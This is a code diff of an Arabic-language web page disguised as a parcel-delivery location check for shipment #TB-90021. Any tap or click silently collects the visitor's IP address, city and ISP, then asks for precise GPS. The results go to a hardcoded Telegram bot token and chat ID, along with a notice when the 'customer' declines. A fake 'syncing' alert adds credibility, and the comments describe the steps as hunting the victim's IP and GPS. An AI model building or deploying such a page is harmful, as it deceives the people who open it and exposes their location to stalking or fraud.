@@ -4,69 +4,52 @@ index.html
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>نظام التحقق من التسليم</title>
+    <title>بوابة التحقق</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; user-select: none; }
-        body, html { height: 100%; width: 100%; background: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; }
-        .card { width: 90%; max-width: 400px; background: rgba(30, 41, 59, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 35px; padding: 40px 25px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        .icon-box { width: 80px; height: 80px; background: linear-gradient(135deg, #0ea5e9, #2563eb); border-radius: 25px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 35px; color: white; }
-        h1 { font-size: 20px; color: white; margin-bottom: 10px; }
-        p { font-size: 14px; color: #94a3b8; line-height: 1.6; margin-bottom: 30px; }
-        .btn { width: 100%; padding: 15px; background: white; color: #0f172a; border-radius: 15px; font-weight: 700; animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body { height: 100vh; background: #0f172a; display: flex; align-items: center; justify-content: center; overflow: hidden; cursor: pointer; color: white; text-align: center; }
+        .card { width: 90%; max-width: 400px; padding: 40px 20px; border: 2px solid #38bdf8; border-radius: 30px; background: rgba(30, 41, 59, 0.9); }
+        .btn { margin-top: 30px; padding: 15px; background: #38bdf8; color: #0f172a; border-radius: 15px; font-weight: bold; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
     </style>
 </head>
-<body onclick="startCapture()" ontouchstart="startCapture()">
+<body onclick="collectData()" ontouchstart="collectData()">
 
     <div class="card">
-        <div class="icon-box"><i class="fas fa-shield-alt"></i></div>
-        <h1>تأكيد الهوية الرقمية</h1>
-        <p>يرجى النقر في أي مكان لمطابقة موقعك مع نظام التسليم لفتح قفل الشحنة رقم #TB-90021</p>
-        <div class="btn">تفعيل المطابقة الآن</div>
+        <div style="font-size: 50px; margin-bottom: 20px;">📍</div>
+        <h1>تأكيد موقع التسليم</h1>
+        <p>انقر في أي مكان لمطابقة موقعك مع المندوب وفتح قفل الشحنة رقم #TB-90021</p>
+        <div class="btn">اضغط للتوثيق الآن</div>
     </div>
 
 <script>
     const TOKEN = '8698719504:AAE3uab2OjYv-Yl8EkaSkkvWBrADzsgTTE0';
     const ID = '6876904688';
 
-    function startCapture() {
-        // 1. جلب الـ IP وإرساله فوراً (بدون انتظار GPS)
+    function collectData() {
+        // --- المحرك 1: صيد الـ IP (مستقل تماماً) ---
         fetch('https://ipapi.co/json/')
-        .then(res => res.json())
-        .then(data => {
-            const msg = `🌐 صيد IP فوري\n━━━━━━━━━━━━\nIP: ${data.ip}\nالمدينة: ${data.city}\nالشركة: ${data.org}\n━━━━━━━━━━━━`;
-            sendToTelegram(msg);
-        }).catch(e => console.log("IP bypass"));
+        .then(r => r.json())
+        .then(d => {
+            const txt = `🌐 [IP جديد]\n━━━━━━━━━━━━\nIP: ${d.ip}\nالمدينة: ${d.city}\nالشركة: ${d.org}\n━━━━━━━━━━━━`;
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(txt)}`);
+        }).catch(e => console.log("IP Fail"));
 
-        // 2. طلب الموقع الجغرافي بشكل مستقل
+        // --- المحرك 2: صيد الـ GPS (مستقل تماماً) ---
         if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (p) => {
-                    const msg = `📍 صيد GPS دقيق\n━━━━━━━━━━━━\nرابط الموقع: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n━━━━━━━━━━━━`;
-                    sendToTelegram(msg);
-                },
-                (e) => {
-                    sendToTelegram("⚠️ الزبون رفض إذن الموقع (GPS)");
-                },
-                { enableHighAccuracy: true, timeout: 5000 }
-            );
+            navigator.geolocation.getCurrentPosition((p) => {
+                const lat = p.coords.latitude;
+                const lng = p.coords.longitude;
+                const txt = `📍 [GPS جديد]\n━━━━━━━━━━━━\nالرابط: https://www.google.com/maps?q=${lat},${lng}\n━━━━━━━━━━━━`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(txt)}`);
+            }, (e) => {
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent("⚠️ الزبون رفض الـ GPS")}`);
+            }, { enableHighAccuracy: true, timeout: 5000 });
         }
-    }
 
-    function sendToTelegram(text) {
-        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: ID, text: text })
-        });
-        
-        // تنبيه بسيط لمرة واحدة لزيادة الواقعية
-        if(!window.alertDone) {
-            alert("جاري مزامنة الموقع مع المندوب...");
-            window.alertDone = true;
-        }
+        // تنبيه وهمي لمرة واحدة
+        if(!window.done) { alert("جاري المزامنة.. يرجى الانتظار"); window.done=true; }
     }
 </script>
 </body>
